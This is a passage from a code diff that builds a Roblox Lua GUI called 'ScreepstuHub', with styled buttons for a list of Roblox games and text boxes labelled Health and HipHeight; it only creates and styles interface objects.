+ScreepstuHub.ImageLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.ImageLabel_4.BackgroundTransparency = 1.000
+ScreepstuHub.ImageLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.ImageLabel_4.BorderSizePixel = 0
+ScreepstuHub.ImageLabel_4.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.ImageLabel_4.ZIndex = 3
+ScreepstuHub.ImageLabel_4.Image = "rbxassetid://17774766051"
+
+ScreepstuHub.TextLabel_4.Parent = ScreepstuHub.ImageLabel_4
+ScreepstuHub.TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_4.BackgroundTransparency = 1.000
+ScreepstuHub.TextLabel_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.TextLabel_4.BorderSizePixel = 0
+ScreepstuHub.TextLabel_4.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.TextLabel_4.ZIndex = 4
+ScreepstuHub.TextLabel_4.Font = Enum.Font.Arial
+ScreepstuHub.TextLabel_4.Text = "Clown Killing Reborn"
+ScreepstuHub.TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_4.TextScaled = true
+ScreepstuHub.TextLabel_4.TextSize = 14.000
+ScreepstuHub.TextLabel_4.TextStrokeTransparency = 0.000
+ScreepstuHub.TextLabel_4.TextWrapped = true
+
+ScreepstuHub.UITextSizeConstraint_26.Parent = ScreepstuHub.TextLabel_4
+ScreepstuHub.UITextSizeConstraint_26.MaxTextSize = 14
+
+ScreepstuHub.UIStroke_18.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_18.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_18.Thickness = 2
+ScreepstuHub.UIStroke_18.Parent = ScreepstuHub.ClownKilling
+
+ScreepstuHub.DollhouseRP.Name = "DollhouseRP"
+ScreepstuHub.DollhouseRP.Parent = ScreepstuHub.Container3
+ScreepstuHub.DollhouseRP.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.DollhouseRP.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.DollhouseRP.BorderSizePixel = 0
+ScreepstuHub.DollhouseRP.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.DollhouseRP.ZIndex = 2
+ScreepstuHub.DollhouseRP.Font = Enum.Font.SourceSans
+ScreepstuHub.DollhouseRP.Text = ""
+ScreepstuHub.DollhouseRP.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.DollhouseRP.TextSize = 14.000
+
+ScreepstuHub.ImageLabel_5.Parent = ScreepstuHub.DollhouseRP
+ScreepstuHub.ImageLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.ImageLabel_5.BackgroundTransparency = 1.000
+ScreepstuHub.ImageLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.ImageLabel_5.BorderSizePixel = 0
+ScreepstuHub.ImageLabel_5.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.ImageLabel_5.ZIndex = 3
+ScreepstuHub.ImageLabel_5.Image = "rbxassetid://17774801001"
+
+ScreepstuHub.TextLabel_5.Parent = ScreepstuHub.ImageLabel_5
+ScreepstuHub.TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_5.BackgroundTransparency = 1.000
+ScreepstuHub.TextLabel_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.TextLabel_5.BorderSizePixel = 0
+ScreepstuHub.TextLabel_5.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.TextLabel_5.ZIndex = 4
+ScreepstuHub.TextLabel_5.Font = Enum.Font.Arial
+ScreepstuHub.TextLabel_5.Text = "Dollhouse RP"
+ScreepstuHub.TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_5.TextScaled = true
+ScreepstuHub.TextLabel_5.TextSize = 14.000
+ScreepstuHub.TextLabel_5.TextStrokeTransparency = 0.000
+ScreepstuHub.TextLabel_5.TextWrapped = true
+
+ScreepstuHub.UITextSizeConstraint_27.Parent = ScreepstuHub.TextLabel_5
+ScreepstuHub.UITextSizeConstraint_27.MaxTextSize = 14
+
+ScreepstuHub.UIStroke_19.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_19.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_19.Thickness = 2
+ScreepstuHub.UIStroke_19.Parent = ScreepstuHub.DollhouseRP
+
+ScreepstuHub.FreeRadio.Name = "FreeRadio"
+ScreepstuHub.FreeRadio.Parent = ScreepstuHub.Container3
+ScreepstuHub.FreeRadio.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.FreeRadio.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.FreeRadio.BorderSizePixel = 0
+ScreepstuHub.FreeRadio.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.FreeRadio.ZIndex = 2
+ScreepstuHub.FreeRadio.Font = Enum.Font.SourceSans
+ScreepstuHub.FreeRadio.Text = ""
+ScreepstuHub.FreeRadio.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.FreeRadio.TextSize = 14.000
+
+ScreepstuHub.ImageLabel_6.Parent = ScreepstuHub.FreeRadio
+ScreepstuHub.ImageLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.ImageLabel_6.BackgroundTransparency = 1.000
+ScreepstuHub.ImageLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.ImageLabel_6.BorderSizePixel = 0
+ScreepstuHub.ImageLabel_6.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.ImageLabel_6.ZIndex = 3
+ScreepstuHub.ImageLabel_6.Image = "rbxassetid://17774818011"
+
+ScreepstuHub.TextLabel_6.Parent = ScreepstuHub.ImageLabel_6
+ScreepstuHub.TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_6.BackgroundTransparency = 1.000
+ScreepstuHub.TextLabel_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.TextLabel_6.BorderSizePixel = 0
+ScreepstuHub.TextLabel_6.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.TextLabel_6.ZIndex = 4
+ScreepstuHub.TextLabel_6.Font = Enum.Font.Arial
+ScreepstuHub.TextLabel_6.Text = "Free Radio Boombox"
+ScreepstuHub.TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_6.TextScaled = true
+ScreepstuHub.TextLabel_6.TextSize = 14.000
+ScreepstuHub.TextLabel_6.TextStrokeTransparency = 0.000
+ScreepstuHub.TextLabel_6.TextWrapped = true
+
+ScreepstuHub.UITextSizeConstraint_28.Parent = ScreepstuHub.TextLabel_6
+ScreepstuHub.UITextSizeConstraint_28.MaxTextSize = 14
+
+ScreepstuHub.UIStroke_20.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_20.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_20.Thickness = 2
+ScreepstuHub.UIStroke_20.Parent = ScreepstuHub.FreeRadio
+
+ScreepstuHub.HideNSeekExtreme.Name = "HideNSeekExtreme"
+ScreepstuHub.HideNSeekExtreme.Parent = ScreepstuHub.Container3
+ScreepstuHub.HideNSeekExtreme.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.HideNSeekExtreme.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.HideNSeekExtreme.BorderSizePixel = 0
+ScreepstuHub.HideNSeekExtreme.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.HideNSeekExtreme.ZIndex = 2
+ScreepstuHub.HideNSeekExtreme.Font = Enum.Font.SourceSans
+ScreepstuHub.HideNSeekExtreme.Text = ""
+ScreepstuHub.HideNSeekExtreme.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.HideNSeekExtreme.TextSize = 14.000
+
+ScreepstuHub.ImageLabel_7.Parent = ScreepstuHub.HideNSeekExtreme
+ScreepstuHub.ImageLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.ImageLabel_7.BackgroundTransparency = 1.000
+ScreepstuHub.ImageLabel_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.ImageLabel_7.BorderSizePixel = 0
+ScreepstuHub.ImageLabel_7.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.ImageLabel_7.ZIndex = 3
+ScreepstuHub.ImageLabel_7.Image = "rbxassetid://834653916"
+
+ScreepstuHub.TextLabel_7.Parent = ScreepstuHub.ImageLabel_7
+ScreepstuHub.TextLabel_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_7.BackgroundTransparency = 1.000
+ScreepstuHub.TextLabel_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.TextLabel_7.BorderSizePixel = 0
+ScreepstuHub.TextLabel_7.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.TextLabel_7.ZIndex = 4
+ScreepstuHub.TextLabel_7.Font = Enum.Font.Arial
+ScreepstuHub.TextLabel_7.Text = "Hide N Seek Extreme"
+ScreepstuHub.TextLabel_7.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_7.TextScaled = true
+ScreepstuHub.TextLabel_7.TextSize = 14.000
+ScreepstuHub.TextLabel_7.TextStrokeTransparency = 0.000
+ScreepstuHub.TextLabel_7.TextWrapped = true
+
+ScreepstuHub.UITextSizeConstraint_29.Parent = ScreepstuHub.TextLabel_7
+ScreepstuHub.UITextSizeConstraint_29.MaxTextSize = 14
+
+ScreepstuHub.UIStroke_21.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_21.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_21.Thickness = 2
+ScreepstuHub.UIStroke_21.Parent = ScreepstuHub.HideNSeekExtreme
+
+ScreepstuHub.HoldPeopleTheGame.Name = "HoldPeopleTheGame"
+ScreepstuHub.HoldPeopleTheGame.Parent = ScreepstuHub.Container3
+ScreepstuHub.HoldPeopleTheGame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.HoldPeopleTheGame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.HoldPeopleTheGame.BorderSizePixel = 0
+ScreepstuHub.HoldPeopleTheGame.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.HoldPeopleTheGame.ZIndex = 2
+ScreepstuHub.HoldPeopleTheGame.Font = Enum.Font.SourceSans
+ScreepstuHub.HoldPeopleTheGame.Text = ""
+ScreepstuHub.HoldPeopleTheGame.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.HoldPeopleTheGame.TextSize = 14.000
+
+ScreepstuHub.ImageLabel_8.Parent = ScreepstuHub.HoldPeopleTheGame
+ScreepstuHub.ImageLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.ImageLabel_8.BackgroundTransparency = 1.000
+ScreepstuHub.ImageLabel_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.ImageLabel_8.BorderSizePixel = 0
+ScreepstuHub.ImageLabel_8.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.ImageLabel_8.ZIndex = 3
+ScreepstuHub.ImageLabel_8.Image = "rbxassetid://17785596180"
+
+ScreepstuHub.TextLabel_8.Parent = ScreepstuHub.ImageLabel_8
+ScreepstuHub.TextLabel_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_8.BackgroundTransparency = 1.000
+ScreepstuHub.TextLabel_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.TextLabel_8.BorderSizePixel = 0
+ScreepstuHub.TextLabel_8.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.TextLabel_8.ZIndex = 4
+ScreepstuHub.TextLabel_8.Font = Enum.Font.Arial
+ScreepstuHub.TextLabel_8.Text = "Hold People"
+ScreepstuHub.TextLabel_8.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_8.TextScaled = true
+ScreepstuHub.TextLabel_8.TextSize = 14.000
+ScreepstuHub.TextLabel_8.TextStrokeTransparency = 0.000
+ScreepstuHub.TextLabel_8.TextWrapped = true
+
+ScreepstuHub.UITextSizeConstraint_30.Parent = ScreepstuHub.TextLabel_8
+ScreepstuHub.UITextSizeConstraint_30.MaxTextSize = 14
+
+ScreepstuHub.UIStroke_22.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_22.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_22.Thickness = 2
+ScreepstuHub.UIStroke_22.Parent = ScreepstuHub.HoldPeopleTheGame
+
+ScreepstuHub.MurderMystery2.Name = "MurderMystery2"
+ScreepstuHub.MurderMystery2.Parent = ScreepstuHub.Container3
+ScreepstuHub.MurderMystery2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.MurderMystery2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.MurderMystery2.BorderSizePixel = 0
+ScreepstuHub.MurderMystery2.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.MurderMystery2.ZIndex = 2
+ScreepstuHub.MurderMystery2.Font = Enum.Font.SourceSans
+ScreepstuHub.MurderMystery2.Text = ""
+ScreepstuHub.MurderMystery2.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.MurderMystery2.TextSize = 14.000
+
+ScreepstuHub.ImageLabel_9.Parent = ScreepstuHub.MurderMystery2
+ScreepstuHub.ImageLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.ImageLabel_9.BackgroundTransparency = 1.000
+ScreepstuHub.ImageLabel_9.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.ImageLabel_9.BorderSizePixel = 0
+ScreepstuHub.ImageLabel_9.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.ImageLabel_9.ZIndex = 3
+ScreepstuHub.ImageLabel_9.Image = "rbxassetid://15932862165"
+
+ScreepstuHub.TextLabel_9.Parent = ScreepstuHub.ImageLabel_9
+ScreepstuHub.TextLabel_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_9.BackgroundTransparency = 1.000
+ScreepstuHub.TextLabel_9.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.TextLabel_9.BorderSizePixel = 0
+ScreepstuHub.TextLabel_9.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.TextLabel_9.ZIndex = 4
+ScreepstuHub.TextLabel_9.Font = Enum.Font.Arial
+ScreepstuHub.TextLabel_9.Text = "Murder Mystery 2"
+ScreepstuHub.TextLabel_9.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_9.TextScaled = true
+ScreepstuHub.TextLabel_9.TextSize = 14.000
+ScreepstuHub.TextLabel_9.TextStrokeTransparency = 0.000
+ScreepstuHub.TextLabel_9.TextWrapped = true
+
+ScreepstuHub.UITextSizeConstraint_31.Parent = ScreepstuHub.TextLabel_9
+ScreepstuHub.UITextSizeConstraint_31.MaxTextSize = 14
+
+ScreepstuHub.UIStroke_23.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_23.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_23.Thickness = 2
+ScreepstuHub.UIStroke_23.Parent = ScreepstuHub.MurderMystery2
+
+ScreepstuHub.MurderMysteryXFreeRadioNHunter2.Name = "MurderMysteryXFreeRadioNHunter2"
+ScreepstuHub.MurderMysteryXFreeRadioNHunter2.Parent = ScreepstuHub.Container3
+ScreepstuHub.MurderMysteryXFreeRadioNHunter2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.MurderMysteryXFreeRadioNHunter2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.MurderMysteryXFreeRadioNHunter2.BorderSizePixel = 0
+ScreepstuHub.MurderMysteryXFreeRadioNHunter2.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.MurderMysteryXFreeRadioNHunter2.ZIndex = 2
+ScreepstuHub.MurderMysteryXFreeRadioNHunter2.Font = Enum.Font.SourceSans
+ScreepstuHub.MurderMysteryXFreeRadioNHunter2.Text = ""
+ScreepstuHub.MurderMysteryXFreeRadioNHunter2.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.MurderMysteryXFreeRadioNHunter2.TextSize = 14.000
+
+ScreepstuHub.ImageLabel_10.Parent = ScreepstuHub.MurderMysteryXFreeRadioNHunter2
+ScreepstuHub.ImageLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.ImageLabel_10.BackgroundTransparency = 1.000
+ScreepstuHub.ImageLabel_10.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.ImageLabel_10.BorderSizePixel = 0
+ScreepstuHub.ImageLabel_10.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.ImageLabel_10.ZIndex = 3
+ScreepstuHub.ImageLabel_10.Image = "rbxassetid://17774861189"
+
+ScreepstuHub.TextLabel_10.Parent = ScreepstuHub.ImageLabel_10
+ScreepstuHub.TextLabel_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_10.BackgroundTransparency = 1.000
+ScreepstuHub.TextLabel_10.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.TextLabel_10.BorderSizePixel = 0
+ScreepstuHub.TextLabel_10.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.TextLabel_10.ZIndex = 4
+ScreepstuHub.TextLabel_10.Font = Enum.Font.Arial
+ScreepstuHub.TextLabel_10.Text = "Murder Mystery X Free Radio N Hunter 2"
+ScreepstuHub.TextLabel_10.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_10.TextScaled = true
+ScreepstuHub.TextLabel_10.TextSize = 14.000
+ScreepstuHub.TextLabel_10.TextStrokeTransparency = 0.000
+ScreepstuHub.TextLabel_10.TextWrapped = true
+
+ScreepstuHub.UITextSizeConstraint_32.Parent = ScreepstuHub.TextLabel_10
+ScreepstuHub.UITextSizeConstraint_32.MaxTextSize = 14
+
+ScreepstuHub.UIStroke_24.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_24.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_24.Thickness = 2
+ScreepstuHub.UIStroke_24.Parent = ScreepstuHub.MurderMysteryXFreeRadioNHunter2
+
+ScreepstuHub.SniperBeta.Name = "SniperBeta"
+ScreepstuHub.SniperBeta.Parent = ScreepstuHub.Container3
+ScreepstuHub.SniperBeta.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.SniperBeta.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.SniperBeta.BorderSizePixel = 0
+ScreepstuHub.SniperBeta.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.SniperBeta.ZIndex = 2
+ScreepstuHub.SniperBeta.Font = Enum.Font.SourceSans
+ScreepstuHub.SniperBeta.Text = ""
+ScreepstuHub.SniperBeta.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.SniperBeta.TextSize = 14.000
+
+ScreepstuHub.ImageLabel_11.Parent = ScreepstuHub.SniperBeta
+ScreepstuHub.ImageLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.ImageLabel_11.BackgroundTransparency = 1.000
+ScreepstuHub.ImageLabel_11.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.ImageLabel_11.BorderSizePixel = 0
+ScreepstuHub.ImageLabel_11.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.ImageLabel_11.ZIndex = 3
+ScreepstuHub.ImageLabel_11.Image = "rbxassetid://17774892873"
+
+ScreepstuHub.TextLabel_11.Parent = ScreepstuHub.ImageLabel_11
+ScreepstuHub.TextLabel_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_11.BackgroundTransparency = 1.000
+ScreepstuHub.TextLabel_11.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.TextLabel_11.BorderSizePixel = 0
+ScreepstuHub.TextLabel_11.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.TextLabel_11.ZIndex = 4
+ScreepstuHub.TextLabel_11.Font = Enum.Font.Arial
+ScreepstuHub.TextLabel_11.Text = "Sniper Beta"
+ScreepstuHub.TextLabel_11.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_11.TextScaled = true
+ScreepstuHub.TextLabel_11.TextSize = 14.000
+ScreepstuHub.TextLabel_11.TextStrokeTransparency = 0.000
+ScreepstuHub.TextLabel_11.TextWrapped = true
+
+ScreepstuHub.UITextSizeConstraint_33.Parent = ScreepstuHub.TextLabel_11
+ScreepstuHub.UITextSizeConstraint_33.MaxTextSize = 14
+
+ScreepstuHub.UIStroke_25.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_25.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_25.Thickness = 2
+ScreepstuHub.UIStroke_25.Parent = ScreepstuHub.SniperBeta
+
+ScreepstuHub.StopItSlender.Name = "StopItSlender"
+ScreepstuHub.StopItSlender.Parent = ScreepstuHub.Container3
+ScreepstuHub.StopItSlender.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.StopItSlender.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.StopItSlender.BorderSizePixel = 0
+ScreepstuHub.StopItSlender.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.StopItSlender.ZIndex = 2
+ScreepstuHub.StopItSlender.Font = Enum.Font.SourceSans
+ScreepstuHub.StopItSlender.Text = ""
+ScreepstuHub.StopItSlender.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.StopItSlender.TextSize = 14.000
+
+ScreepstuHub.ImageLabel_12.Parent = ScreepstuHub.StopItSlender
+ScreepstuHub.ImageLabel_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.ImageLabel_12.BackgroundTransparency = 1.000
+ScreepstuHub.ImageLabel_12.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.ImageLabel_12.BorderSizePixel = 0
+ScreepstuHub.ImageLabel_12.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.ImageLabel_12.ZIndex = 3
+ScreepstuHub.ImageLabel_12.Image = "rbxassetid://17774939283"
+
+ScreepstuHub.TextLabel_12.Parent = ScreepstuHub.ImageLabel_12
+ScreepstuHub.TextLabel_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_12.BackgroundTransparency = 1.000
+ScreepstuHub.TextLabel_12.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.TextLabel_12.BorderSizePixel = 0
+ScreepstuHub.TextLabel_12.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.TextLabel_12.ZIndex = 4
+ScreepstuHub.TextLabel_12.Font = Enum.Font.Arial
+ScreepstuHub.TextLabel_12.Text = "Stop It Slender"
+ScreepstuHub.TextLabel_12.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_12.TextScaled = true
+ScreepstuHub.TextLabel_12.TextSize = 14.000
+ScreepstuHub.TextLabel_12.TextStrokeTransparency = 0.000
+ScreepstuHub.TextLabel_12.TextWrapped = true
+
+ScreepstuHub.UITextSizeConstraint_34.Parent = ScreepstuHub.TextLabel_12
+ScreepstuHub.UITextSizeConstraint_34.MaxTextSize = 14
+
+ScreepstuHub.UIStroke_26.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_26.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_26.Thickness = 2
+ScreepstuHub.UIStroke_26.Parent = ScreepstuHub.StopItSlender
+
+ScreepstuHub.TowerOfFun.Name = "TowerOfFun"
+ScreepstuHub.TowerOfFun.Parent = ScreepstuHub.Container3
+ScreepstuHub.TowerOfFun.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TowerOfFun.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.TowerOfFun.BorderSizePixel = 0
+ScreepstuHub.TowerOfFun.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.TowerOfFun.ZIndex = 2
+ScreepstuHub.TowerOfFun.Font = Enum.Font.SourceSans
+ScreepstuHub.TowerOfFun.Text = ""
+ScreepstuHub.TowerOfFun.TextColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.TowerOfFun.TextSize = 14.000
+
+ScreepstuHub.ImageLabel_13.Parent = ScreepstuHub.TowerOfFun
+ScreepstuHub.ImageLabel_13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.ImageLabel_13.BackgroundTransparency = 1.000
+ScreepstuHub.ImageLabel_13.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.ImageLabel_13.BorderSizePixel = 0
+ScreepstuHub.ImageLabel_13.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.ImageLabel_13.ZIndex = 3
+ScreepstuHub.ImageLabel_13.Image = "rbxassetid://17774915434"
+
+ScreepstuHub.TextLabel_13.Parent = ScreepstuHub.ImageLabel_13
+ScreepstuHub.TextLabel_13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_13.BackgroundTransparency = 1.000
+ScreepstuHub.TextLabel_13.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.TextLabel_13.BorderSizePixel = 0
+ScreepstuHub.TextLabel_13.Size = UDim2.new(1, 0, 1, 0)
+ScreepstuHub.TextLabel_13.ZIndex = 4
+ScreepstuHub.TextLabel_13.Font = Enum.Font.Arial
+ScreepstuHub.TextLabel_13.Text = "Tower Of Fun"
+ScreepstuHub.TextLabel_13.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.TextLabel_13.TextScaled = true
+ScreepstuHub.TextLabel_13.TextSize = 14.000
+ScreepstuHub.TextLabel_13.TextStrokeTransparency = 0.000
+ScreepstuHub.TextLabel_13.TextWrapped = true
+
+ScreepstuHub.UITextSizeConstraint_35.Parent = ScreepstuHub.TextLabel_13
+ScreepstuHub.UITextSizeConstraint_35.MaxTextSize = 14
+
+ScreepstuHub.UIStroke_27.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_27.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_27.Thickness = 2
+ScreepstuHub.UIStroke_27.Parent = ScreepstuHub.TowerOfFun
+
+ScreepstuHub.Container1.Name = "Container1"
+ScreepstuHub.Container1.Parent = ScreepstuHub.ScreepstuHub
+ScreepstuHub.Container1.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+ScreepstuHub.Container1.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Container1.BorderSizePixel = 0
+ScreepstuHub.Container1.Position = UDim2.new(0, 100, 0, 30)
+ScreepstuHub.Container1.Size = UDim2.new(1, -100, 1, -30)
+
+ScreepstuHub.Health.Name = "Health"
+ScreepstuHub.Health.Parent = ScreepstuHub.Container1
+ScreepstuHub.Health.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.Health.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Health.BorderSizePixel = 0
+ScreepstuHub.Health.Position = UDim2.new(0, 16, 0, 16)
+ScreepstuHub.Health.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.Health.ZIndex = 2
+ScreepstuHub.Health.Font = Enum.Font.Roboto
+ScreepstuHub.Health.PlaceholderText = "Health: ? (100)"
+ScreepstuHub.Health.Text = ""
+ScreepstuHub.Health.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.Health.TextScaled = true
+ScreepstuHub.Health.TextSize = 14.000
+ScreepstuHub.Health.TextWrapped = true
+
+ScreepstuHub.UIStroke_28.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_28.Color = Color3.fromRGB(111, 111, 111)
+ScreepstuHub.UIStroke_28.Parent = ScreepstuHub.Health
+
+ScreepstuHub.UITextSizeConstraint_36.Parent = ScreepstuHub.Health
+ScreepstuHub.UITextSizeConstraint_36.MaxTextSize = 14
+
+ScreepstuHub.HipHeight.Name = "HipHeight"
+ScreepstuHub.HipHeight.Parent = ScreepstuHub.Container1
+ScreepstuHub.HipHeight.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.HipHeight.BorderColor3 = Color3.fromRGB(0, 0, 0)
